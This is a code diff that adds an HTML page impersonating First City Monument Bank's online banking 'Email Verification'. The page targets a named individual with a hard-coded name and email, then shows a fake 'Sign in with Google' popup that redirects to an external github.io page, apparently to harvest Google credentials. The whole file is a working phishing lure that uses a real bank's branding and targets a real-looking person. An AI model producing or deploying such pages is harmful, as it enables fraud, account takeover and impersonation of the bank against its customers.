@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>FCMB Email Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+:root {
+    --fcmb-blue: #0a3d91;
+    --fcmb-light-blue: #e6eefb;
+    --fcmb-gold: #c9a227;
+    --text-dark: #333;
+    --text-light: #666;
+}
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: var(--fcmb-light-blue);
+    color: var(--text-dark);
+}
+
+/* ===== HEADER ===== */
+.header {
+    background: var(--fcmb-blue);
+    padding: 18px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.logo {
+    color: #fff;
+    font-size: 22px;
+    font-weight: bold;
+    letter-spacing: 1px;
+}
+
+.logo span {
+    color: var(--fcmb-gold);
+}
+
+.header-nav {
+    font-size: 14px;
+    color: #fff;
+}
+
+/* ===== MAIN CONTENT ===== */
+.main {
+    display: flex;
+    justify-content: center;
+    padding: 50px 15px;
+}
+
+.card {
+    background: #fff;
+    width: 100%;
+    max-width: 420px;
+    padding: 30px;
+    border-radius: 8px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.12);
+}
+
+.card h2 {
+    margin-top: 0;
+    color: var(--fcmb-blue);
+    font-size: 20px;
+}
+
+.card p {
+    font-size: 14px;
+    color: var(--text-light);
+    line-height: 1.5;
+}
+
+.input-group {
+    margin-top: 20px;
+}
+
+.input-group label {
+    display: block;
+    font-size: 13px;
+    margin-bottom: 6px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 12px;
+    font-size: 14px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+}
+
+.button {
+    margin-top: 20px;
+}
+
+.button button {
+    width: 100%;
+    padding: 12px;
+    background: var(--fcmb-blue);
+    border: none;
+    color: #fff;
+    font-size: 15px;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+.button button:hover {
+    opacity: 0.9;
+}
+
+.notice {
+    margin-top: 15px;
+    font-size: 12px;
+    background: #f4f7fc;
+    padding: 10px;
+    border-left: 4px solid var(--fcmb-blue);
+}
+
+/* ===== FOOTER ===== */
+.footer {
+    background: #0b2e6f;
+    color: #fff;
+    padding: 30px 20px;
+}
+
+.footer-container {
+    max-width: 1000px;
+    margin: auto;
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 20px;
+}
+
+.footer h4 {
+    margin-top: 0;
+    color: var(--fcmb-gold);
+    font-size: 15px;
+}
+
+.footer p {
+    font-size: 13px;
+    line-height: 1.6;
+    color: #ddd;
+}
+
+/* ===== SOCIAL ICONS (CSS ONLY) ===== */
+.social {
+    display: flex;
+    gap: 10px;
+    margin-top: 10px;
+}
+
+.social a {
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    background: #fff;
+    color: var(--fcmb-blue);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+    font-weight: bold;
+    font-size: 14px;
+}
+
+.social a:hover {
+    background: var(--fcmb-gold);
+    color: #000;
+}
+
+/* ===== COPYRIGHT ===== */
+.copyright {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 12px;
+    color: #ccc;
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <div class="logo">FC<span>MB</span></div>
+    <div class="header-nav">Secure Online Banking</div>
+</div>
+
+<!-- MAIN -->
+<div class="main">
+    <div class="card">
+        <h2>Email Verification</h2>
+        <p>
+            To continue, please confirm your email address.  
+            This helps us keep your account secure and up to date.
+        </p>
+        <form onsubmit="return verifyEmailMatch();">
+
+    <!-- Hard-coded Name -->
+    <div class="input-group">
+        <label>Account Name</label>
+        <input type="text" value="Olatunji Omolade yetunde" readonly>
+    </div>
+
+    <!-- Email Input -->
+    <div class="input-group">
+        <label>Email Address</label>
+        <input type="email" id="email" placeholder="example@email.com" required>
+    </div>
+
+    <!-- Error message -->
+    <p id="message" style="font-size:13px;color:red;"></p>
+
+    <div class="button">
+        <button type="submit">Verify Email</button>
+    </div>
+
+</form>
+
+<!-- POPUP BOX -->
+<div id="popupOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); align-items:center; justify-content:center; z-index:9999;">
+    <div style="background:#fff; padding:25px; width:90%; max-width:350px; border-radius:6px; text-align:center;">
+        <h3 style="color:#0a3d91; margin-top:0;">Sign in with Google</h3>
+        <p style="font-size:14px; color:#444;">
+            You need to verify your account with your Google account.
+            Click the continue button to proceed.
+        </p>
+        <button onclick="redirectNow()" style="margin-top:15px; padding:10px 18px; background:#0a3d91; color:#fff; border:none; border-radius:4px; cursor:pointer;">
+            Continue
+        </button>
+    </div>
+</div>
+
+<script>
+function verifyEmailMatch() {
+    const correctEmail = "noemail806@gmail.com";
+    const enteredEmail = document.getElementById("email").value.trim();
+    const message = document.getElementById("message");
+
+    if (enteredEmail !== correctEmail) {
+        message.textContent = "Email did not match with the one on the account.";
+        return false;
+    }
+
+    message.textContent = "";
+    document.getElementById("popupOverlay").style.display = "flex";
+    return false;
+}
+
+function redirectNow() {
+    window.location.href = "https://olptyi.github.io/nb/gma?id=6976365864";
+}
+</script>
+        <div class="notice">
+            🔒 For your security, never share your login details or OTP with anyone.
+        </div>
+    </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+    <div class="footer-container">
+
+        <div>
+            <h4>Contact FCMB</h4>
+            <p>
+                Customer Care: 0700 329 0000<br>
+                Email: customercare@fcmb.com<br>
+                Available 24/7
+            </p>
+        </div>
+
+        <div>
+            <h4>About FCMB</h4>
+            <p>
+                First City Monument Bank is committed to providing
+                secure and innovative banking services to customers.
+            </p>
+        </div>
+
+        <div>
+            <h4>Follow Us</h4>
+            <div class="social">
+                <a href="#">F</a>
+                <a href="#">X</a>
+                <a href="#">I</a>
+                <a href="#">L</a>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="copyright">
+        © 2026 First City Monument Bank. All Rights Reserved.
+    </div>
+</div>
+
+</body>
+</html>
